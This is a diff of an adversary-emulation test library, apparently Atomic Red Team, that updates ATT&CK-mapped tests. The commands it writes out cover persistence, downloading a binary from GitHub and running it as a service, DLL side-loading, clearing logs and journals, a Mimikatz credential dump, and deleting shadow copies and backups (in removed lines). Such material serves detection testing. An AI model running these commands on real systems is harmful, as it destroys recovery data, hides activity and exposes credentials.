@@ -1502,25 +1502,48 @@ persistence:
       identifier: T1044
     atomic_tests:
     - name: File System Permissions Weakness
-      description: "This test to show checking file system permissions weakness and
-        which can lead to privilege escalation by replacing malicious file. Example;
-        check weak file permission and then replace.\npowershell -c \"Get-WmiObject
-        win32_service | select PathName\"   (check service file location) and \ncopy
-        /Y C:\\temp\\payload.exe C:\\ProgramData\\folder\\Update\\weakpermissionfile.exe
-        \  ( replace weak permission file with malicious file )\n"
+      description: |
+        This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.
+        powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
+        copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
+
+        Upon execution, open the weak permission file at %temp%\T1044_weak_permission_file.txt and verify that it's contents read "T1044 Malicious file". To verify
+        the weak file permissions, open File Explorer to%temp%\T1044_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
       supported_platforms:
       - windows
       input_arguments:
         weak_permission_file:
           description: check weak files permission
           type: path
-          default: GoogleUpdate.exe
+          default: "$env:TEMP\\T1044_weak_permission_file.txt"
+        malicious_file:
+          description: File to replace weak permission file with
+          type: path
+          default: "$env:TEMP\\T1044\\T1044_malicious_file.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: A file must exist on disk at specified location (#{weak_permission_file})
+        prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
+          1}'
+        get_prereq_command: |-
+          New-Item #{weak_permission_file} -Force | Out-Null
+          Set-Content -Path #{weak_permission_file} -Value "T1044 Weak permission file"
+      - description: A file to replace the original weak_permission_file. In an attack
+          this would be the malicious file gaining extra privileges
+        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory -Path $env:TEMP\T1044\ -Force | Out-Null
+          New-Item #{malicious_file} -Force | Out-Null
+          Set-Content -Path #{malicious_file} -Value "T1044 Malicious file"
       executor:
         name: powershell
         elevation_required: false
         command: |
           Get-WmiObject win32_service | select PathName
-          get-acl "C:\Program Files (x86)\Google\Update\#{weak_permission_file}" | FL | findstr "FullControl"
+          Copy-Item #{malicious_file} -Destination #{weak_permission_file} -Force
+        cleanup_command: |
+          Remove-Item #{weak_permission_file} -Force -ErrorAction Ignore
+          Remove-Item -Recurse (Split-Path #{malicious_file}) -Force -ErrorAction Ignore
   T1158:
     technique:
       x_mitre_data_sources:
@@ -3123,9 +3146,9 @@ persistence:
       modified: '2019-07-18T16:43:25.906Z'
       identifier: T1050
     atomic_tests:
-    - name: Service Installation
+    - name: Service Installation CMD
       description: |
-        Installs A Local Service.
+        Download an executable from github and start it as a service.
 
         Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.
       supported_platforms:
@@ -3159,7 +3182,7 @@ persistence:
       description: |
         Installs A Local Service via PowerShell.
 
-        Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will output via stdout.
+        Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.
       supported_platforms:
       - windows
       input_arguments:
@@ -3182,9 +3205,9 @@ persistence:
         name: powershell
         elevation_required: true
         command: |
-          New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}" 2>&1 | Out-Null
+          New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
           Start-Service -Name "#{service_name}"
-        cleanup_command: |-
+        cleanup_command: |
           Stop-Service -Name "#{service_name}" 2>&1 | Out-Null
           try {(Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()}
           catch {}
@@ -3554,7 +3577,8 @@ persistence:
     atomic_tests:
     - name: Append malicious start-process cmdlet
       description: 'Appends a start process cmdlet to the current user''s powershell
-        profile pofile that points to a malicious executable
+        profile pofile that points to a malicious executable. Upon execution, calc.exe
+        will be launched.
 
 '
       supported_platforms:
@@ -3568,19 +3592,19 @@ persistence:
           description: Powershell profile to use
           type: String
           default: "$profile"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Ensure a powershell profile exists for the current user
+        prereq_command: 'if (Test-Path #{ps_profile}) {exit 0} else {exit 1}'
+        get_prereq_command: 'New-Item -Path #{ps_profile} -Type File -Force'
       executor:
         name: powershell
         elevation_required: false
         command: |
-          if(Test-Path #{ps_profile}){
-          }
-          else{
-            New-Item -Path #{ps_profile} -Type File -Force
-          }
-          $malicious = "Start-Process #{exe_path}"
-          Add-Content #{ps_profile} -Value $malicious
-          powershell -command exit
-        cleanup_command: |-
+          Add-Content #{ps_profile} -Value ""
+          Add-Content #{ps_profile} -Value "Start-Process #{exe_path}"
+          powershell -Command exit
+        cleanup_command: |
           $oldprofile = cat $profile | Select-Object -skiplast 1
           Set-Content $profile -Value $oldprofile
   T1163:
@@ -4576,25 +4600,29 @@ persistence:
     - name: Shortcut Modification
       description: |
         This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;
-        gci -path "C:\Users" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern "exe" | FL
+        gci -path "C:\Users" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern "exe" | FL.
+        Upon execution, calc.exe will be launched.
       supported_platforms:
       - windows
       input_arguments:
         shortcut_file_path:
           description: shortcut modified and execute
           type: path
-          default: shortcutname.url
+          default: "%temp%\\T1023_modified_shortcut.url"
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'echo [InternetShortcut] > test.url && echo URL=C:\windows\system32\calc.exe
-          >> #{shortcut_file_path} && #{shortcut_file_path} >nul 2>&1
+        command: |
+          echo [InternetShortcut] > #{shortcut_file_path}
+          echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path}
+          #{shortcut_file_path}
+        cleanup_command: 'del -f #{shortcut_file_path} >nul 2>&1
 
 '
     - name: Create shortcut to cmd in startup folders
-      description: 'LNK file to launch CMD placed in startup folder
-
-'
+      description: |
+        LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+        to view the new shortcut.
       supported_platforms:
       - windows
       executor:
@@ -5075,11 +5103,10 @@ persistence:
       modified: '2019-10-15T18:43:47.703Z'
       identifier: T1084
     atomic_tests:
-    - name: Persistence
+    - name: Persistence via WMI Event Subscription
       description: |
-        Run from an administrator powershell window
-
-        After running, reboot the victim machine. After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.
+        Run from an administrator powershell window. After running, reboot the victim machine.
+        After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.
 
         Code references
 
@@ -5111,7 +5138,6 @@ persistence:
           $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
           $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
           $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
-
           $FilterConsumerBindingToCleanup | Remove-WmiObject
           $EventConsumerToCleanup | Remove-WmiObject
           $EventFilterToCleanup | Remove-WmiObject
@@ -6681,11 +6707,9 @@ defense-evasion:
       identifier: T1073
     atomic_tests:
     - name: DLL Side-Loading using the Notepad++ GUP.exe binary
-      description: 'GUP is an open source signed binary used by Notepad++ for software
-        updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl
-        dll to be loaded
-
-'
+      description: |
+        GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.
+        Upon execution, calc.exe will be opened.
       supported_platforms:
       - windows
       input_arguments:
@@ -6693,11 +6717,25 @@ defense-evasion:
           description: Name of the created process
           type: string
           default: calculator.exe
+        gup_executable:
+          description: GUP is an open source signed binary used by Notepad++ for software
+            updates
+          type: path
+          default: PathToAtomicsFolder\T1073\bin\GUP.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Gup.exe binary must exist on disk at specified location (#{gup_executable})
+        prereq_command: 'if (Test-Path #{gup_executable}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1073/bin/GUP.exe" -OutFile "#{gup_executable}"
       executor:
         name: command_prompt
         elevation_required: false
-        command: "$PathToAtomicsFolder\\T1073\\bin\\GUP.exe\n"
-        cleanup_command: 'taskkill /F /IM #{process_name}'
+        command: "#{gup_executable}\n"
+        cleanup_command: 'taskkill /F /IM #{process_name}
+
+'
   T1140:
     technique:
       x_mitre_permissions_required:
@@ -7333,101 +7371,101 @@ defense-evasion:
 
 '
     - name: Delete a single file - Windows cmd
-      description: 'Delete a single file from the temporary directory using cmd.exe
-
-'
+      description: |
+        Delete a single file from the temporary directory using cmd.exe.
+        Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.
       supported_platforms:
       - windows
+      input_arguments:
+        file_to_delete:
+          description: File to delete. Run the prereq command to create it if it does
+            not exist.
+          type: string
+          default: "%temp%\\deleteme_T1107"
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: The file to delete must exist on disk at specified location (#{file_to_delete})
+        prereq_command: IF EXIST "#{file_to_delete}" ( EXIT 0 ) ELSE ( EXIT 1 )
+        get_prereq_command: 'echo deleteme_T1107 >> #{file_to_delete}'
       executor:
         name: command_prompt
         elevation_required: false
-        command: |
-          echo "T1107" > %temp%\T1107.txt
-          del /f  %temp%\T1107.txt >nul 2>&1
+        command: 'del /f #{file_to_delete}
+
+'
     - name: Delete an entire folder - Windows cmd
-      description: 'Recursively delete the temporary directory and all files contained
-        within it using cmd.exe
-
-'
+      description: |
+        Recursively delete a folder in the temporary directory using cmd.exe.
+        Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.
       supported_platforms:
       - windows
+      input_arguments:
+        folder_to_delete:
+          description: Folder to delete. Run the prereq command to create it if it
+            does not exist.
+          type: string
+          default: "%temp%\\deleteme_T1107"
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: The file to delete must exist on disk at specified location (#{folder_to_delete})
+        prereq_command: IF EXIST "#{folder_to_delete}" ( EXIT 0 ) ELSE ( EXIT 1 )
+        get_prereq_command: 'mkdir #{folder_to_delete}'
       executor:
         name: command_prompt
         elevation_required: false
-        command: |
-          mkdir %temp%\T1107
-          rmdir /s /q %temp%\T1107
+        command: 'rmdir /s /q #{folder_to_delete}
+
+'
     - name: Delete a single file - Windows PowerShell
-      description: 'Delete a single file from the temporary directory using Powershell
+      description: 'Delete a single file from the temporary directory using Powershell.
+        Upon execution, no output will be displayed. Use File Explorer to verify the
+        file was deleted.
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        file_to_delete:
+          description: File to delete. Run the prereq command to create it if it does
+            not exist.
+          type: string
+          default: "$env:TEMP\\deleteme_T1107"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The file to delete must exist on disk at specified location (#{file_to_delete})
+        prereq_command: 'if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}'
+        get_prereq_command: 'New-Item -Path #{file_to_delete} | Out-Null'
       executor:
         name: powershell
         elevation_required: false
-        command: |
-          New-Item $env:TEMP\T1107.txt
-          Remove-Item -path $env:TEMP\T1107.txt
+        command: 'Remove-Item -path #{file_to_delete}
+
+'
     - name: Delete an entire folder - Windows PowerShell
-      description: 'Recursively delete the temporary directory and all files contained
-        within it using Powershell
+      description: 'Recursively delete a folder in the temporary directory using Powershell.
+        Upon execution, no output will be displayed. Use File Explorer to verify the
+        folder was deleted.
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        folder_to_delete:
+          description: Folder to delete. Run the prereq command to create it if it
+            does not exist.
+          type: string
+          default: "$env:TEMP\\deleteme_folder_T1107"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The folder to delete must exist on disk at specified location
+          (#{folder_to_delete})
+        prereq_command: 'if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}'
+        get_prereq_command: 'New-Item -Path #{folder_to_delete} -Type Directory |
+          Out-Null'
       executor:
         name: powershell
         elevation_required: false
-        command: |
-          New-Item $env:TEMP\T1107 -ItemType Directory
-          Remove-Item -path $env:TEMP\T1107 -recurse
-    - name: Delete VSS - vssadmin
-      description: 'Delete all volume shadow copies with vssadmin.exe
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        elevation_required: true
-        command: 'vssadmin.exe Delete Shadows /All /Quiet
-
-'
-    - name: Delete VSS - wmic
-      description: 'Delete all volume shadow copies with wmic
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        elevation_required: true
-        command: 'wmic shadowcopy delete
-
-'
-    - name: bcdedit
-      description: 'This test leverages `bcdedit` to remove boot-time recovery measures.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        elevation_required: true
-        command: |
-          bcdedit /set {default} bootstatuspolicy ignoreallfailures
-          bcdedit /set {default} recoveryenabled no
-    - name: wbadmin
-      description: 'This test deletes Windows Backup catalogs.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        elevation_required: true
-        command: 'wbadmin delete catalog -quiet
+        command: 'Remove-Item -Path #{folder_to_delete} -Recurse
 
 '
     - name: Delete Filesystem - Linux
@@ -7444,10 +7482,9 @@ defense-evasion:
 
 '
     - name: Delete-PrefetchFile
-      description: 'Delete a single prefetch file.  Deletion of prefetch files is
-        a known anti-forensic technique.
-
-'
+      description: |
+        Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run "(Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" | Measure-Object).Count"
+        before and after the test to verify that the number of prefetch files decreases by 1.
       supported_platforms:
       - windows
       executor:
@@ -7461,22 +7498,30 @@ defense-evasion:
       description: |
         Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.
         This test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer
-        log file format of TeamViewerXX_Logfile.log
+        log file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.
+
         https://twitter.com/SBousseaden/status/1197524463304290305?s=20
       supported_platforms:
       - windows
-      - macos
+      input_arguments:
+        teamviewer_log_file:
+          description: Teamviewer log file to delete. Run the prereq command to create
+            it if it does not exist.
+          type: string
+          default: "$env:TEMP\\TeamViewer_54.log"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The folder to delete must exist on disk at specified location
+          (#{teamviewer_log_file})
+        prereq_command: 'if (Test-Path #{teamviewer_log_file}) {exit 0} else {exit
+          1}'
+        get_prereq_command: 'New-Item -Path #{teamviewer_log_file} | Out-Null'
       executor:
         name: powershell
         elevation_required: false
-        command: |
-          if ($env:os -eq "Windows_NT") {
-            New-Item $env:TEMP\TeamViewer_54.log
-            Remove-Item $env:TEMP\TeamViewer_54.log
-          } else {
-            New-Item $env:HOME\TeamViewer_54.log
-            Remove-Item $env:HOME\TeamViewer_54.log
-          }
+        command: 'Remove-Item #{teamviewer_log_file}
+
+'
   T1222:
     technique:
       x_mitre_data_sources:
@@ -8673,7 +8718,9 @@ defense-evasion:
       identifier: T1070
     atomic_tests:
     - name: Clear Logs
-      description: 'Upon execution this test will clear Windows Event Logs
+      description: 'Upon execution this test will clear Windows Event Logs. Open the
+        System.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is
+        now empty.
 
 '
       supported_platforms:
@@ -8690,16 +8737,18 @@ defense-evasion:
 
 '
     - name: FSUtil
-      description: 'Manages the update sequence number (USN) change journal, which
-        provides a persistent log of all changes made to files on the volume.
-
-'
+      description: |
+        Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon exectuion, no output
+        will be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         elevation_required: true
         command: 'fsutil usn deletejournal /D C:
+
+'
+        cleanup_command: 'fsutil usn createjournal m=1000 a=100 c:
 
 '
     - name: rm -rf
@@ -8750,10 +8799,10 @@ defense-evasion:
 
 '
     - name: Delete System Logs Using PowerShell
-      description: 'Recommended Detection: Monitor for use of the windows event log
-        filepath in PowerShell couple with delete arguments
-
-'
+      description: |
+        Recommended Detection: Monitor for use of the windows event log filepath in PowerShell couple with delete arguments.
+        Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.
+        When this service get's stopped, it is automatically restarted and the Security.evtx folder re-created.
       supported_platforms:
       - windows
       executor:
@@ -8767,9 +8816,9 @@ defense-evasion:
 
 '
     - name: Delete System Logs Using Clear-EventLogId
-      description: 'Clear event logs using built-in PowerShell commands
-
-'
+      description: |
+        Clear event logs using built-in PowerShell commands.
+        Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.
       supported_platforms:
       - windows
       executor:
@@ -10753,6 +10802,9 @@ defense-evasion:
     - name: Parent PID Spoofing using PowerShell
       description: |
         This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.
+        Upon execution, "Process C:\Program Files\Internet Explorer\iexplore.exe is spawned with pid ####" will be displayed and
+        calc.exe will be launched.
+
         Credit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)
       supported_platforms:
       - windows
@@ -11656,7 +11708,8 @@ defense-evasion:
       identifier: T1085
     atomic_tests:
     - name: Rundll32 execute JavaScript Remote Payload With GetObject
-      description: 'Test execution of a remote script using rundll32.exe
+      description: 'Test execution of a remote script using rundll32.exe. Upon execution
+        notepad.exe will be opened.
 
 '
       supported_platforms:
@@ -11718,6 +11771,7 @@ defense-evasion:
     - name: Rundll32 ieadvpack.dll Execution
       description: |
         Test execution of a command using rundll32.exe with ieadvpack.dll.
+        Upon execution calc.exe will be launched
 
         Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
       supported_platforms:
@@ -11742,7 +11796,7 @@ defense-evasion:
 '
     - name: Rundll32 syssetup.dll Execution
       description: |
-        Test execution of a command using rundll32.exe with syssetup.dll.
+        Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying "installation failed" will be opened
 
         Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
       supported_platforms:
@@ -11768,7 +11822,7 @@ defense-evasion:
 '
     - name: Rundll32 setupapi.dll Execution
       description: |
-        Test execution of a command using rundll32.exe with setupapi.dll.
+        Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying "installation failed" will be opened
 
         Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
       supported_platforms:
@@ -11873,7 +11927,8 @@ defense-evasion:
           chmod +x /tmp/art.sh
           sh /tmp/art.sh
     - name: Create and Execute Batch Script
-      description: 'Creates and executes a simple batch script.
+      description: 'Creates and executes a simple batch script. Upon execution, CMD
+        will briefly launh to run the batch script then close again.
 
 '
       supported_platforms:
@@ -11883,17 +11938,24 @@ defense-evasion:
           description: Command to execute within script.
           type: string
           default: dir
-        script_to_create:
+        script_path:
           description: Path of script to create.
           type: path
-          default: C:\Windows\TEMP\execute.bat
+          default: "$env:TEMP\\T1064_script.bat"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Batch file must exist on disk at specified location (#{script_path})
+        prereq_command: 'if (Test-Path #{script_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item #{script_path} -Force | Out-Null
+          Set-Content -Path #{script_path} -Value "#{command_to_execute}"
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
-        command: "C:\\Windows\\system32\\cmd.exe /Q /c echo #{command_to_execute}
-          > #{script_to_create}\nC:\\Windows\\system32\\cmd.exe /Q /c #{script_to_create}
-          \n"
-        cleanup_command: 'del #{script_to_create} >nul 2>&1
+        command: 'Start-Process #{script_path}
+
+'
+        cleanup_command: 'Remove-Item #{script_path} -Force -ErrorAction Ignore
 
 '
   T1218:
@@ -13983,25 +14045,48 @@ privilege-escalation:
       identifier: T1044
     atomic_tests:
     - name: File System Permissions Weakness
-      description: "This test to show checking file system permissions weakness and
-        which can lead to privilege escalation by replacing malicious file. Example;
-        check weak file permission and then replace.\npowershell -c \"Get-WmiObject
-        win32_service | select PathName\"   (check service file location) and \ncopy
-        /Y C:\\temp\\payload.exe C:\\ProgramData\\folder\\Update\\weakpermissionfile.exe
-        \  ( replace weak permission file with malicious file )\n"
+      description: |
+        This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.
+        powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
+        copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
+
+        Upon execution, open the weak permission file at %temp%\T1044_weak_permission_file.txt and verify that it's contents read "T1044 Malicious file". To verify
+        the weak file permissions, open File Explorer to%temp%\T1044_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
       supported_platforms:
       - windows
       input_arguments:
         weak_permission_file:
           description: check weak files permission
           type: path
-          default: GoogleUpdate.exe
+          default: "$env:TEMP\\T1044_weak_permission_file.txt"
+        malicious_file:
+          description: File to replace weak permission file with
+          type: path
+          default: "$env:TEMP\\T1044\\T1044_malicious_file.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: A file must exist on disk at specified location (#{weak_permission_file})
+        prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
+          1}'
+        get_prereq_command: |-
+          New-Item #{weak_permission_file} -Force | Out-Null
+          Set-Content -Path #{weak_permission_file} -Value "T1044 Weak permission file"
+      - description: A file to replace the original weak_permission_file. In an attack
+          this would be the malicious file gaining extra privileges
+        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory -Path $env:TEMP\T1044\ -Force | Out-Null
+          New-Item #{malicious_file} -Force | Out-Null
+          Set-Content -Path #{malicious_file} -Value "T1044 Malicious file"
       executor:
         name: powershell
         elevation_required: false
         command: |
           Get-WmiObject win32_service | select PathName
-          get-acl "C:\Program Files (x86)\Google\Update\#{weak_permission_file}" | FL | findstr "FullControl"
+          Copy-Item #{malicious_file} -Destination #{weak_permission_file} -Force
+        cleanup_command: |
+          Remove-Item #{weak_permission_file} -Force -ErrorAction Ignore
+          Remove-Item -Recurse (Split-Path #{malicious_file}) -Force -ErrorAction Ignore
   T1179:
     technique:
       x_mitre_data_sources:
@@ -14458,9 +14543,9 @@ privilege-escalation:
       modified: '2019-07-18T16:43:25.906Z'
       identifier: T1050
     atomic_tests:
-    - name: Service Installation
+    - name: Service Installation CMD
       description: |
-        Installs A Local Service.
+        Download an executable from github and start it as a service.
 
         Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.
       supported_platforms:
@@ -14494,7 +14579,7 @@ privilege-escalation:
       description: |
         Installs A Local Service via PowerShell.
 
-        Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will output via stdout.
+        Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.
       supported_platforms:
       - windows
       input_arguments:
@@ -14517,9 +14602,9 @@ privilege-escalation:
         name: powershell
         elevation_required: true
         command: |
-          New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}" 2>&1 | Out-Null
+          New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
           Start-Service -Name "#{service_name}"
-        cleanup_command: |-
+        cleanup_command: |
           Stop-Service -Name "#{service_name}" 2>&1 | Out-Null
           try {(Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()}
           catch {}
@@ -14601,6 +14686,9 @@ privilege-escalation:
     - name: Parent PID Spoofing using PowerShell
       description: |
         This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.
+        Upon execution, "Process C:\Program Files\Internet Explorer\iexplore.exe is spawned with pid ####" will be displayed and
+        calc.exe will be launched.
+
         Credit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)
       supported_platforms:
       - windows
@@ -14792,7 +14880,8 @@ privilege-escalation:
     atomic_tests:
     - name: Append malicious start-process cmdlet
       description: 'Appends a start process cmdlet to the current user''s powershell
-        profile pofile that points to a malicious executable
+        profile pofile that points to a malicious executable. Upon execution, calc.exe
+        will be launched.
 
 '
       supported_platforms:
@@ -14806,19 +14895,19 @@ privilege-escalation:
           description: Powershell profile to use
           type: String
           default: "$profile"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Ensure a powershell profile exists for the current user
+        prereq_command: 'if (Test-Path #{ps_profile}) {exit 0} else {exit 1}'
+        get_prereq_command: 'New-Item -Path #{ps_profile} -Type File -Force'
       executor:
         name: powershell
         elevation_required: false
         command: |
-          if(Test-Path #{ps_profile}){
-          }
-          else{
-            New-Item -Path #{ps_profile} -Type File -Force
-          }
-          $malicious = "Start-Process #{exe_path}"
-          Add-Content #{ps_profile} -Value $malicious
-          powershell -command exit
-        cleanup_command: |-
+          Add-Content #{ps_profile} -Value ""
+          Add-Content #{ps_profile} -Value "Start-Process #{exe_path}"
+          powershell -Command exit
+        cleanup_command: |
           $oldprofile = cat $profile | Select-Object -skiplast 1
           Set-Content $profile -Value $oldprofile
   T1055:
@@ -15844,10 +15933,9 @@ impact:
       identifier: T1531
     atomic_tests:
     - name: Change User Password - Windows
-      description: 'Changes the user password to hinder access attempts. Seen in use
-        by LockerGoga.
-
-'
+      description: |
+        Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account "AtomicAdministrator" with
+        the password "HuHuHUHoHo283283".
       supported_platforms:
       - windows
       input_arguments:
@@ -15877,7 +15965,8 @@ impact:
 
 '
     - name: Delete User - Windows
-      description: 'Deletes a user account to prevent access.
+      description: 'Deletes a user account to prevent access. Upon execution, run
+        the command "net user" to verify that the new "AtomicUser" account was deleted.
 
 '
       supported_platforms:
@@ -15898,7 +15987,9 @@ impact:
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'net.exe user #{user_account} /delete'
+        command: 'net.exe user #{user_account} /delete
+
+'
   T1485:
     technique:
       x_mitre_data_sources:
@@ -16584,7 +16675,9 @@ impact:
       executor:
         name: bash
         elevation_required: true
-        command: "halt -p      \n"
+        command: 'halt -p
+
+'
     - name: Reboot System via `halt` - Linux
       description: 'This test restarts a Linux system using `halt`.
 
@@ -16594,7 +16687,9 @@ impact:
       executor:
         name: bash
         elevation_required: true
-        command: "halt --reboot      \n"
+        command: 'halt --reboot
+
+'
     - name: Shutdown System via `poweroff` - Linux
       description: 'This test shuts down a Linux system using `poweroff`.
 
@@ -16604,7 +16699,9 @@ impact:
       executor:
         name: bash
         elevation_required: true
-        command: "poweroff      \n"
+        command: 'poweroff
+
+'
     - name: Reboot System via `poweroff` - Linux
       description: 'This test restarts a Linux system using `poweroff`.
 
@@ -16614,7 +16711,9 @@ impact:
       executor:
         name: bash
         elevation_required: true
-        command: 'poweroff --reboot  '
+        command: 'poweroff --reboot
+
+'
 discovery:
   T1087:
     technique:
@@ -17331,9 +17430,9 @@ discovery:
       identifier: T1083
     atomic_tests:
     - name: File and Directory Discovery (cmd.exe)
-      description: 'Find or discover files on the file system
-
-'
+      description: |
+        Find or discover files on the file system.  Upon execution, the file "download" will be placed in the temporary folder and contain the output of
+        all of the data discovery commands.
       supported_platforms:
       - windows
       executor:
@@ -17343,13 +17442,13 @@ discovery:
           dir /s c:\ >> %temp%\download
           dir /s "c:\Documents and Settings" >> %temp%\download
           dir /s "c:\Program Files\" >> %temp%\download
-          dir /s d:\ >> %temp%\download
           dir "%systemdrive%\Users\*.*" >> %temp%\download
           dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download
           dir "%userprofile%\Desktop\*.*" >> %temp%\download
           tree /F >> %temp%\download
     - name: File and Directory Discovery (PowerShell)
-      description: 'Find or discover files on the file system
+      description: 'Find or discover files on the file system. Upon execution, file
+        and folder information will be displayed.
 
 '
       supported_platforms:
@@ -18553,11 +18652,9 @@ discovery:
       identifier: T1518
     atomic_tests:
     - name: Find and Display Internet Explorer Browser Version
-      description: 'Adversaries may attempt to get a listing of non-security related
-        software that is installed on the system. Adversaries may use the information
-        from Software Discovery during automated discovery to shape follow-on behaviors
-
-'
+      description: |
+        Query the registry to determine the version of internet explorer installed on the system.
+        Upon execution, version information about internet explorer will be displayed.
       supported_platforms:
       - windows
       executor:
@@ -18568,11 +18665,9 @@ discovery:
 
 '
     - name: Applications Installed
-      description: 'Adversaries may attempt to get a listing of all software that
-        is installed on the system. Adversaries may use the information from Software
-        Discovery during automated discovery to shape follow-on behaviors
-
-'
+      description: |
+        Query the registry to determine software and versions installed on the system. Upon execution a table of
+        software name and version information will be displayed.
       supported_platforms:
       - windows
       executor:
@@ -23087,7 +23182,8 @@ execution:
       identifier: T1086
     atomic_tests:
     - name: Mimikatz
-      description: 'Download Mimikatz and dump credentials
+      description: 'Download Mimikatz and dump credentials. Upon execution, mimikatz
+        dump details and password hashes will be displayed.
 
 '
       supported_platforms:
